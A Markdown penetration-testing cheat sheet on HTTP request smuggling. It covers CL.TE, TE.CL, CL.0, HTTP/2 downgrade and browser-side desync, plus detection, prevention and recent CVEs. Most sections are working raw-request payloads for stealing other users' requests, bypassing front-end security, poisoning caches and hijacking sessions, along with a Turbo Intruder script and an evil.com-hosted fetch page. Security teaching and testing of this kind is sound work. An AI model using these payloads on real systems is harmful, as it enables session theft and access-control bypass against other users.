---
tags:
  - high
  - infra
---

# HTTP Request Smuggling

Desync front-end/back-end parsing of Content-Length vs Transfer-Encoding headers to inject requests.

## TL;DR

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

If timeout occurs, back-end uses `Transfer-Encoding` (vulnerable to CL.TE).

## How It Works

- Front-end (proxy/CDN) and back-end disagree on request boundaries
- Attacker's "leftover" data becomes prefix of next user's request
- Enables request hijacking, security bypass, cache poisoning

## Vulnerability Types

| Type | Front-End Uses | Back-End Uses |
|------|----------------|---------------|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | TE (normal) | TE (obfuscated) |

## Detection

### Burp Settings
**Disable before testing:**
- Update Content-Length
- Normalize HTTP/1 line endings

### CL.TE Detection

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
0

```

**Vulnerable if:** Back-end times out (expecting more chunks).

### TE.CL Detection

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

**Vulnerable if:** Back-end times out (expecting body per CL).

### TE.TE Detection (Obfuscation)

Try until one server ignores TE:
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
[space]Transfer-Encoding: chunked
```

## Exploitation

### CL.TE Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 30
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

- Front-end sends all 30 bytes
- Back-end sees chunked end + smuggled GET
- Next user's request prefixed with `/admin`

### TE.CL Smuggling

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

7b
GET /admin HTTP/1.1
Host: target.com
Content-Length: 30

x=
0

```

### Bypass Front-End Security

```http
POST / HTTP/1.1
Content-Length: 67
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```

Smuggled request reaches backend directly, bypassing WAF.

### Steal Other Users' Requests

```http
POST / HTTP/1.1
Content-Length: 319
Transfer-Encoding: chunked

0

POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

comment=
```

Next user's request becomes `comment` value → visible to attacker.

### Reflected XSS via Smuggling

```http
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 213

0

GET /page?id=2 HTTP/1.1
User-Agent: "><script>alert(1)</script>
Content-Length: 10

x=
```

Victim receives response with XSS in smuggled User-Agent.

### Cache Poisoning via Smuggling

```http
POST / HTTP/1.1
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/app.js HTTP/1.1
X-Evil-Header: <script>alert(1)</script>

```

Poisons `/static/app.js` for all users.

## H2C Smuggling

HTTP/2 over cleartext upgrade can bypass proxy security:

```http
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

**Impact:** Bypass path restrictions, WAF bypass.

## WebSocket Smuggling

```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Sec-WebSocket-Version: 1337  # Invalid

# Proxy thinks WS valid, backend rejects with 426
# TCP connection open for raw requests
```

## Response Smuggling

### HEAD Method Confusion

```http
HEAD /page HTTP/1.1
Host: target.com

GET /evil HTTP/1.1
```

- HEAD response has `Content-Length` but no body
- Next victim's response body interpreted incorrectly

## Tools

| Tool | Purpose |
|------|---------|
| [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler) | Detection + exploitation |
| [smuggler.py](https://github.com/defparam/smuggler) | Automated detection |
| [h2csmuggler](https://github.com/BishopFox/h2csmuggler) | H2C attacks |

### Turbo Intruder CL.TE

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           pipeline=False)
    
    attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 35

0

GET /admin HTTP/1.1
X: x'''
    
    engine.queue(attack)
    
    for i in range(14):
        engine.queue('GET / HTTP/1.1\r\nHost: target.com\r\n\r\n')
        time.sleep(0.05)
```

## Prevention

- Use HTTP/2 end-to-end
- Normalize headers before forwarding
- Reject ambiguous requests (both CL and TE)
- Drop requests with TE obfuscation

---

## H2 Downgrade Attacks

> Source: PortSwigger Research (James Kettle, Black Hat 2021/2025), Imperva 2025, Akamai 2025

HTTP/2 front-ends terminate TLS and downgrade to HTTP/1.1 before forwarding to backends. This creates new smuggling surfaces because H2 headers are framed (not CRLF-delimited) but get converted to CRLF-based H1.1.

### H2.CL — Falsified Content-Length in HTTP/2

Front-end uses H2 framing (ignores CL), back-end uses H1.1 CL for body boundary:

```
# HTTP/2 request with false content-length: 0
:method  POST
:path    /example
:authority  target.com
content-type  application/x-www-form-urlencoded
content-length  0

GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

x=1
```

After H2→H1 downgrade, the backend sees `Content-Length: 0` and treats `GET /admin` as a new request.

*Affected: Netty (CVE-2021-21295), various CDNs*

### H2.X — Request Splitting via CRLF Injection

Inject `\r\n\r\n` into an H2 header value to split the H1.1 output into two requests:

```
:method  GET
:path    /
:authority  target.com
foo  bar\r\n\r\nGET /admin HTTP/1.1\r\nX-Ignore: x
```

Backend receives 2 requests but front-end expects 1 response → second response served to next client. Enables **response queue poisoning** (session hijacking).

### Request Line Injection via :method Pseudo-Header

```
:method  GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\nx: x
:path    /ignored
:authority  target.com
```

After downgrade, injects `Transfer-Encoding: chunked` into the H1.1 request line. Bypasses patches that filter header values but not pseudo-headers.

### H2 Downgrade via Cloudflare / Akamai

Both Cloudflare and Akamai terminate HTTP/2 and proxy HTTP/1.1 internally. CRLF in an H2 header value passes to the H1.1 backend as a header separator:

```
header: value\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com
```

---

## CL.0 Desync

Some endpoints implicitly treat `Content-Length` as 0 (GET, HEAD, or endpoints that reject bodies). No ambiguous TE/CL needed:

```http
POST /accessible-endpoint HTTP/1.1
Host: target.com
Content-Length: 34
Connection: keep-alive

GET /sensitive-path HTTP/1.1
Foo: x
```

Front-end sends all 34 bytes. Back-end ignores the body for this endpoint → `GET /sensitive-path` becomes a new request.

**Conditions:**
- Back-end ignores body for the target endpoint
- Connection is keep-alive (reused)

---

## Chunked Extension Desync (Imperva, August 2025)

Exploits ambiguous parsing of chunk extensions (`;` without name = RFC 9112 violation):

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked

a;
<10 bytes>
0

GET /admin HTTP/1.1
Host: target.com
```

- Front-end: ignores bare `;`, processes as normal chunk
- Back-end: interprets `\n` after `;` as end of chunk header → desync

*Source: Imperva Blog, August 2025*

---

## Request Tunnelling via HTTP/2

When the front-end doesn't multiplex connections across users, **request tunnelling** allows exfiltrating internal headers added by the front-end (IP addresses, auth tokens, `X-Forwarded-*`):

```
:method  POST
:path    /comment
:authority  target.com
content-type  application/x-www-form-urlencoded
foo  bar\r\nContent-Length: 200\r\n\r\ncomment=
```

The front-end's internal headers get appended into `comment=` parameter value → captured in response or stored.

### Blind Tunnelling → Non-Blind via HEAD

```
:method  HEAD
:path    /example
:authority  target.com
foo  bar\r\n\r\nGET /tunnelled HTTP/1.1\r\nHost: target.com\r\nX: x
```

HEAD responses include `Content-Length` but no body. Some front-ends read that many bytes from the back-end response, capturing part of the tunnelled response.

---

## Browser-Powered (Client-Side) Desync

No direct server access needed — exploit via victim's browser:

```html
<!-- Hosted on evil.com — victim visits while logged into target -->
<script>
fetch('https://target.com/', {
    method: 'POST',
    body: 'GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n',
    mode: 'no-cors',
    credentials: 'include'
});
</script>
```

Browser sends 1 request; server desyncs. Next response serves attacker-controlled content to victim.

---

## Response Queue Poisoning — Session Hijacking

Most impactful cross-user technique. Smuggle a complete second request — its response goes to the next user:

```http
POST /vulnerable HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: target.com
```

Back-end processes 2 requests but front-end only expects 1 response. The second response (from `GET /`) queues and is served to the next arbitrary client → leaks their session cookies, auth tokens, or sensitive data.

---

## Recent CVEs

| CVE | Affected | Description | CVSS |
|-----|----------|-------------|------|
| CVE-2025-55315 | ASP.NET Core Kestrel + proxies | CL/TE disagreement, low-priv user bypasses WAF+auth | 9.9 |
| CVE-2025-32094 | Akamai (March 2025) | OPTIONS + obs-fold header continuation | High |
| CVE-2025-54142 | Akamai (August 2025) | OPTIONS with CL+TE body → request smuggling | High |

```http
# CVE-2025-54142 pattern
OPTIONS /api HTTP/1.1
Host: target.com
Content-Length: 45
Transfer-Encoding: chunked

0

GET /sensitive-admin-endpoint HTTP/1.1
```

---

## Detection

### Using HTTP Request Smuggler (Burp Extension)

1. Install HTTP Request Smuggler from BApp Store
2. Run against target with `Scan` mode
3. Check for `CL.TE`, `TE.CL`, `CL.0`, and H2 variants

### Manual Detection Flow

```bash
# CL.TE: send ambiguous request, check for timeout
# TE.CL: send ambiguous request, check for timeout
# CL.0: send POST body to GET-only endpoint, check for unexpected routing
# H2: test via Burp Repeater with HTTP/2 + CRLF in header values
```

!!! warning "Race condition"
    Smuggling tests affect other users' requests. Only test in controlled environments or with explicit permission.
